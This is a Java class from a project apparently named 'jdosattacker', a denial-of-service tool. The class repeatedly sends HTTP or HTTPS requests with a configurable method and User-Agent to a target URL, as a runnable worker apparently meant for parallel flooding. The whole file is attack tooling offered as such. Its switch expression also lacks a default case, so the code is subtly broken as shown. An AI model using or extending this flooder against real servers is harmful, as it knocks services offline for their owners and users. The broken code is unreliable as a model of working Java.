package com.anas.jdosattacker.request;

import javax.net.ssl.HttpsURLConnection;
import java.net.HttpURLConnection;
import java.net.URL;

public class Requester implements Runnable {
    public static String USER_AGENT,
            REQUEST_METHOD;
    public static String url;
    private static int reqNumber;

    protected void sendRequest() {
        try {
            HttpURLConnection connection = switch (url.substring(0, 7)) {
                case "http://" -> (HttpURLConnection) new URL(url).openConnection();
                case "https:/" -> (HttpsURLConnection) new URL(url).openConnection();
            };
            connection.setRequestMethod(REQUEST_METHOD);
            connection.setRequestProperty("User-Agent", USER_AGENT);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);
            connection.connect();
            int responseCode = connection.getResponseCode();
            System.out.println("Response Code : " + responseCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startRequests() {
        for (int i = 0; i < reqNumber; i++) {
            sendRequest();
        }
    }



    public static int getReqNumber() {
        return reqNumber;
    }

    public static void setReqNumber(int reqNumber) {
        Requester.reqNumber = reqNumber;
    }

    @Override
    public void run() {
        startRequests();
    }
}
